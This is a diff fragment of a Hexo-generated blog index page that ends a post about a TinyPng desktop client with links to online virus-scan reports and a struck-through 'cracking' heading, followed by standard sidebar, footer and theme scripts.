+<li><a href="/go.html?u=https://habo.qq.com/file/showdetail?pk=ADcGZ11vB2IIPVs6U2E%3D">腾讯哈勃分析系统-已完成</a></li>
+<li><a href="/go.html?u=http://r.virscan.org/language/zh-cn/report/410764516cfebdbe13c60dc2b6863973">TinyPng in Windows2.exe MD5:39febee57b845977a2602031c5a54a00 22% 的杀软(11/49) 报告发现病毒 - VirSCAN.org-多引擎在线病毒扫描网 v1.02，当前支持 47 款杀毒引擎</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="/go.html?u=https://www.ssyer.com/detailpage/5b98f9d3ed0cbe41f4a8ab3c">美女海边图片 - @Artem Bali - 无版权图片_图片免费商用_免费图片_免费图库_设计素材_背景素材 - 沙沙野</a></li>
+</ul>
+<h2 id="00-12-34补充“破解”"><a href="#00-12-34补充“破解”" class="headerlink" title="00:12:34补充“破解”"></a><del>00:12:34补充“破解”</del></h2>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/post/20190719-mianfeitupianyasuoTinyPngkehuduan/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+  </div>
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/10/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><span class="page-number current">11</span><a class="page-number" href="/page/12/">12</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/12/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
+  </nav>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="JackCh3n"
+      src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/images/avatar.png">
+  <p class="site-author-name" itemprop="name">JackCh3n</p>
+  <div class="site-description" itemprop="description">Record the pit filling process with words</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">118</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">238</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/jackch3n" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jackch3n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://vercel.com/?f=nobige.cn" title="https:&#x2F;&#x2F;vercel.com?f&#x3D;nobige.cn" rel="noopener" target="_blank">vercel</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.jsdelivr.com/?f=nobige.cn" title="https:&#x2F;&#x2F;www.jsdelivr.com?f&#x3D;nobige.cn" rel="noopener" target="_blank">jsdelivr</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.upyun.com/?f=nobige.cn" title="https:&#x2F;&#x2F;www.upyun.com?f&#x3D;nobige.cn" rel="noopener" target="_blank">upyun</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://coding.net/?f=nobige.cn" title="https:&#x2F;&#x2F;coding.net?f&#x3D;nobige.cn" rel="noopener" target="_blank">coding</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://unsplash.com/?f=nobige.cn" title="https:&#x2F;&#x2F;unsplash.com?f&#x3D;nobige.cn" rel="noopener" target="_blank">unsplash</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">JackCh3n</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.1
+  </div>
+  <br/>Powerful CDN service provided by 
+  <a href="https://www.upyun.com" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/images/upyun_logo.png" height="35" width="90" style="display: inline;" alt="upyun"></a> or 
+  <a href="https://www.jsdelivr.com" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/images/jsdelivr_logo.svg" height="30" style="display: inline;" alt="JsDelivr"></a>
+  <br/><a href="https://coding.net" target="_blank" rel="noopener">Coding</a> or
+  <a href="https://vercel.com" target="_blank" rel="noopener">Vercel</a> or
+  provides static Publishing<br/>
+  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.1
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/lib/anime.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/lib/velocity/velocity.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/js/utils.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/js/motion.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/js/schemes/pisces.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/js/next-boot.min.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/JackCh3n/n0bige/js/local-search.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+</body>
+</html>
